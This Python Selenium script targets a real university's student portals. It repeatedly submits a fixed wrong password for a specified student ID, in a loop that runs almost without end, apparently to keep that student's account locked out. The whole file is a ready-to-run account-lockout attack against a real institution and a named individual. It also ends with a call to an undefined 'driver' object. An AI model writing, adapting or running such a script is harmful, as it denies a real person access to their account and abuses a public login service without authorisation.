from sre_constants import MAX_REPEAT
from time import sleep

from selenium import webdriver
from selenium.webdriver.common.keys import Keys
from selenium.webdriver.common.by import By
from selenium.webdriver.support.ui import WebDriverWait
from selenium.webdriver.support import expected_conditions as EC
import os
import selenium.webdriver as webdriver
from selenium.webdriver.firefox.service import Service
from selenium.webdriver.firefox.options import Options

PORTALS = \
    [ \
        "https://portal.ctdb.hcmus.edu.vn", \
        "https://portal1.hcmus.edu.vn", \
        "https://portal2.hcmus.edu.vn", \
        "https://portal3.hcmus.edu.vn", \
        "https://portal4.hcmus.edu.vn", \
        "https://portal5.hcmus.edu.vn", \
        "https://portal6.hcmus.edu.vn", \
    ]

TARGETS = [(0, 20125010)] # protal site id and student id
NUM_CYCLE = MAX_REPEAT
CYCLE_DURATION_IN_SECONDS = 0

user_agent = 'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:87.0) Gecko/20100101 Firefox/87.0'
FireFoxDriverPath = os.path.join(os.getcwd(), 'Drivers', 'geckodriver.exe')
firefox_service = Service(FireFoxDriverPath)
firefox_option = Options()
firefox_option.set_preference("general.useragent.override", user_agent)
browser = webdriver.Firefox(service=firefox_service, options=firefox_option)

url = "https://Python.org"
browser.get(url)

for cycle in range(NUM_CYCLE):
    for target in TARGETS:
        browser.get(PORTALS[target[0]])

        while True:
            try:
                username = WebDriverWait(browser, 10).until(
                    EC.presence_of_element_located((By.NAME, "dnn$ctr$Login$Login_DNN$txtUsername"))
                )
                username.clear()
                username.send_keys(str(target[1]))

                password = WebDriverWait(browser, 10).until(
                    EC.presence_of_element_located((By.NAME, "dnn$ctr$Login$Login_DNN$txtPassword"))
                )
                password.clear()
                password.send_keys("indigo")

                login = WebDriverWait(browser, 10).until(
                    EC.presence_of_element_located((By.NAME, "dnn$ctr$Login$Login_DNN$cmdLogin"))
                )
                login.click()

                error = WebDriverWait(browser, 10).until(
                    EC.presence_of_element_located((By.ID, "dnn_ctr_ctl00_lblMessage"))
                )

                if("locked" in error.text):
                    break
            except:
                break

    sleep(CYCLE_DURATION_IN_SECONDS)

driver.quit()